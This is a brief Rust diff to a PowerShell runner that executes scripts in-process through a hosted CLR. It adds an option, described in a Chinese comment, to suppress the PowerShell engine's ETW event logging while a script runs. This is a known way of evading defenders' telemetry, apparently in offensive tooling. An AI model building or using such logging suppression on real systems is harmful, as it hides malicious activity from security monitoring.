@@ -13,6 +13,12 @@ pub struct PowerShellRunner;
 impl PowerShellRunner {
     /// Execute PowerShell script in-process via the hosted CLR.
     pub fn execute(script: &str, timeout_secs: u64) -> String {
-        libra_psinline::execute_inline(script, timeout_secs)
+        Self::execute_opts(script, timeout_secs, false)
+    }
+
+    /// Execute with options. `suppress_etw` 在执行窗口内瞬态抑制
+    /// PowerShell 引擎的 ETW 事件日志（默认关闭，检测面见 libra-psinline::etw）。
+    pub fn execute_opts(script: &str, timeout_secs: u64, suppress_etw: bool) -> String {
+        libra_psinline::execute_inline_opts(script, timeout_secs, suppress_etw)
     }
 }
